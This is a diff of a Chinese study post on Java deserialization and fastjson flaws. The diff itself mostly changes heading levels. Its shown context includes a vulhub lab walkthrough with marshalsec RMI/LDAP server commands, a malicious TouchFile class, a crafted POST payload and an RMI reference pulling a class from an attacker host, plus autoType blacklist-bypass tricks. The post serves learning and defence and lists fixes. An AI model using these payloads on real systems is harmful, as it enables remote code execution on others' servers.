@@ -16,7 +16,7 @@ categories: [web, security, java]
 
 原生的java序列化反序列化是字节流和java互相转化。
 
-###### java写入io：
+#### java写入io：
 
 ```
 public class SerializationTest {
@@ -35,7 +35,7 @@ public class SerializationTest {
 }
 ```
 
-###### 从 ser.bin 反序列化 {@link Person}
+#### 从 ser.bin 反序列化 {@link Person}
 
 ```
 
@@ -57,7 +57,7 @@ public class UnserializeTest {
 
 上述是序列、反序列正常的应用。
 
-##### 反序列化安全问题原理：
+#### 反序列化安全问题原理：
 
 之所以反序列化会产生安全问题，是因为Java 允许类提供私有的 `readObject(ObjectInputStream ois)`。约定写法是：方法签名固定、`private`，JVM 在反序列化该类的实例时会反射调用它。
 
@@ -108,7 +108,7 @@ public class Person implements Serializable {
 
 序列化然后反序列化就会弹计算器。
 
-###### java<->json实现其实和io流的转化是相似的，额外i引入了@type的概念（fastjson）：
+#### java<->json实现其实和io流的转化是相似的，额外i引入了@type的概念（fastjson）：
 
 ```java
 public class BasicDemo {
@@ -169,7 +169,7 @@ WriteClassName: {"@type":"com.nk7.demo.BasicDemo$Person","user_name":"ClassName"
 
 这个漏洞可以通过vulhub复现，首先先讲解我们用到的工具和payload：
 
-#####  `marshalsec` 
+####  `marshalsec` 
 
 marshalsec 不负责执行恶意逻辑，它只负责 “当有人对我做 JNDI/rmi `lookup` 时，我返回一种会指向远程 HTTP 上某个类的引用；真正执行恶意代码的是受害 JVM 加载并初始化那个类时触发的 Java 语义“TouchFile”，也就是说marshalsec只负责转发。
 
@@ -195,7 +195,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \
 | 9473                               | LDAP 监听端口；受害进程里 `dataSourceName` 写成 `ldap://攻击机:9473/...` 就会连到这里。 |
 | jar 里的 `LDAPRefServer`           | 用内嵌 LDAP 库（如 UnboundID）拦截 LDAP 查询，按固定格式 塞入 `javaCodeBase` / `javaFactory` 等属性，让 受害方 JVM 里的 JNDI 客户端去 按 URL 拉 `.class` 并参与解析。 |
 
-##### `TouchFile.java` 
+#### `TouchFile.java` 
 
 ```
 public class TouchFile {
@@ -219,7 +219,7 @@ public class TouchFile {
 
   
 
-#####  JNDI：InitialContext.lookup
+####  JNDI：InitialContext.lookup
 
 在我们的受害版本中默认开启了：**JdbcRowSetImpl**，这个危险类的dataSourceName支持传入一个rmi的源，当解析这个uri的时候，就会支持rmi远程调用，去指定的rmi地址中去调用方法。
 
@@ -229,7 +229,7 @@ marshalsec 就是专门 伪造 LDAP 返回的工具。
 
 
 
-##### 开启本地的 python -m http.server 8001
+#### 开启本地的 python -m http.server 8001
 
 开启这个端口后，构建的
 
@@ -242,7 +242,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \
 
 
 
-##### 发送恶意Payload（发包）
+#### 发送恶意Payload（发包）
 
 ```
 POST / HTTP/1.1
@@ -289,7 +289,7 @@ RMI服务返回Reference: http://192.168.142.132:8089/LinuxTouch.class
 
 这样目标机器成功存入对应文件，也可以执行其他危险rce操作。
 
-##### 修复
+#### 修复
 
 | 修复方式          | 适用版本 | 说明                                                         |
 | :---------------- | :------- | :----------------------------------------------------------- |
@@ -302,9 +302,9 @@ RMI服务返回Reference: http://192.168.142.132:8089/LinuxTouch.class
 
 官方后续多次修复该漏洞，但在这个版本区间内有多种方法绕过黑白名单，再次利用fastjson1.24的漏洞：
 
-##### fastjson 1.2.25 - 1.2.41 绕过原理
+#### fastjson 1.2.25 - 1.2.41 绕过原理
 
-##### `TypeUtils.loadClass()` 的递归处理逻辑
+#### `TypeUtils.loadClass()` 的递归处理逻辑
 
 在 `loadClass` 方法中，如果类名以 `L` 开头且以 `;` 结尾，会去掉首尾字符后递归调用；如果以 `[` 开头，会去掉 `[` 后递归调用。
 
@@ -335,14 +335,14 @@ if (className.startsWith("[") && className.endsWith(";")) {
 }
 ```
 
-##### 必要条件
+#### 必要条件
 ```java
 ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
 ```
 
 ---
 
-##### fastjson 1.2.42 绕过原理
+#### fastjson 1.2.42 绕过原理
 
 黑名单变成哈希值 + 单次首尾字符检测
 
@@ -356,7 +356,7 @@ if (className.charAt(0) == 'L' && className.charAt(className.length() - 1) == ';
 }
 ```
 
-###### 双写 `L` 和 `;`
+#### 双写 `L` 和 `;`
 
 ```json
 {
@@ -407,7 +407,7 @@ if (className.charAt(0) == 'L' && className.charAt(className.length() - 1) == ';
 
 所以这边来学习一些java反射的原理。
 
-##### 1.1 什么是反射？
+#### 1.1 什么是反射？
 
 **反射**：在运行时动态获取类的信息并操作对象的能力，而不需要在编译时知道具体类名。
 
@@ -423,7 +423,7 @@ Object rs = clazz.newInstance();            // 动态实例化
 
 
 
-##### 1.2 三种获取Class对象的方式
+#### 1.2 三种获取Class对象的方式
 
 ```
 // 方式1：类名.class（编译时确定）
@@ -442,9 +442,9 @@ Class<?> clazz3 = Class.forName(className);  // ← 漏洞利用的关键
 
 ------
 
-##### Class.forName()
+#### Class.forName()
 
-###### 2.1 方法签名
+#### 2.1 方法签名
 
 ```
 // Class类中的静态方法
@@ -454,7 +454,7 @@ public static Class<?> forName(String className) throws ClassNotFoundException
 public static Class<?> forName(String className, boolean initialize, ClassLoader loder)
 ```
 
-###### 2.2 执行过程
+#### 2.2 执行过程
 
 ```
 Class.forName("com.sun.rowset.JdbcRowSetImpl");
@@ -619,8 +619,6 @@ public class ClassDeserializer implements ObjectDeserializer {
 
 ### 5.2 为什么这样能绕过？
 
-java
-
 ```
 // 正常流程（会检查黑白名单）
 Class<?> clazz = Class.forName("com.sun.rowset.JdbcRowSetImpl");
@@ -656,8 +654,4 @@ Object value = field.get(对象实例);
 field.setAccessible(true);  // 突破private限制
 field.set(对象实例, 新值);
 ```
-
-
-
-## 
 
